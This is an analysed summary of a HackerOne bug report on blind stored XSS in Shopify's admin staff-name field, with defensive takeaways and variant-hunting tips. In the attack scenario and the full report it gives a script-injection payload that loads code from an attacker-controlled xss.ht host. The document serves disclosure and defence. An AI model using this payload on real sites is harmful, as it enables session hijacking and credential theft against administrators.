# Blind Stored XSS Via Staff Name Field

## Metadata
- **Source:** HackerOne
- **Report:** 948929 | https://hackerone.com/reports/948929
- **Submitted:** 2020-07-31
- **Reporter:** rioncool22
- **Program:** Shopify
- **Bounty:** Not specified in report
- **Severity:** High
- **Vuln:** Stored Cross-Site Scripting (XSS), Blind XSS, Improper Input Validation, Insufficient Output Encoding
- **CVEs:** None
- **Category:** web-api

## Summary
A blind stored XSS vulnerability exists in the staff account creation functionality where user-supplied input in First and Last Name fields is not properly sanitized or encoded before being stored and rendered. An attacker can inject malicious JavaScript that executes when staff or administrators view account settings, potentially leading to session hijacking or credential theft.

## Attack scenario
1. Attacker obtains access to Shopify admin panel (via phishing, compromised credentials, or partner account)
2. Attacker navigates to https://your-store.myshopify.com/admin/settings/account
3. Attacker creates or modifies a staff account, injecting payload in First Name field: "><script>$.getScript("//attacker-domain.xss.ht")</script>
4. Payload is stored in database without proper validation or sanitization
5. When administrators or other staff members view the account settings page, the stored XSS payload executes in their browser context
6. Attacker's external script loads and executes with admin privileges, enabling session hijacking, cookie theft, or further malicious actions

## Root cause
The staff account management system fails to implement proper input validation and output encoding. The application likely concatenates user input directly into DOM without using safe methods like textContent, proper HTML entity encoding, or Content Security Policy (CSP) headers.

## Attacker mindset
An internal or privileged attacker seeks to establish persistent code execution within the admin panel to harvest credentials, maintain access, or perform actions on behalf of administrators without detection. The 'blind' nature makes it difficult to detect immediately.

## Defensive takeaways
- Implement strict input validation and whitelist allowed characters for name fields (alphanumeric, spaces, hyphens only)
- Use proper output encoding: encode all user input when rendering in HTML context using htmlspecialchars() or framework equivalents
- Apply Content Security Policy (CSP) headers to prevent inline script execution and restrict external script sources
- Use templating engines with auto-escaping enabled (e.g., Handlebars, Jinja2) instead of manual string concatenation
- Implement server-side validation and sanitization of all user inputs before database storage
- Use security headers: X-XSS-Protection, X-Content-Type-Options, X-Frame-Options
- Apply least privilege principle: restrict who can create/modify staff accounts
- Implement audit logging for staff account modifications to detect suspicious changes
- Conduct regular security testing including XSS payload fuzzing against all input fields

## Variant hunting
Test other name-related fields: middle name, display name, nickname in staff and user profiles
Test other admin settings pages: store name, brand name, contact information, email fields
Test file upload fields that might process filename metadata
Test product/collection naming features accessible by staff members
Test customer-facing features that display staff names (staff directory, support contacts)
Check for JavaScript event handlers: onload, onerror, onmouseover in attribute context
Test DOM-based XSS variants: data attributes, SVG/XML contexts, CSS injection vectors

## MITRE ATT&CK
- T1190: Exploit Public-Facing Application
- T1566: Phishing (if credentials required)
- T1059: Command and Scripting Interpreter
- T1074: Data Staged
- T1041: Exfiltration Over C2 Channel

## Notes
This is a blind XSS vulnerability, meaning the attacker cannot immediately see the payload execute but relies on the script loading from an external URL to confirm exploitation. The mention of 'DOM.html' suggests the payload may be rendered client-side through JavaScript templating. Shopify's admin panel is a high-value target; such vulnerabilities could compromise entire e-commerce operations and customer data.

## Full report
<details><summary>Expand</summary>

Hey Team, I found blind stored XSS when i add staff name  in https://your-store.myshopify.com/admin/settings/account

Step to reproduce : 
1. Go to https://your-store.myshopify.com/admin/settings/account
2. Add Staff Account 
3. Fill First & Last Name with this payload "><script>$.getScript("//█████████.xss.ht")</script>
4. XSS will be fired in your internal web

You should check the DOM.html guys

## Impact

Stored XSS

</details>

---
*Analysed by Claude on 2026-05-12*
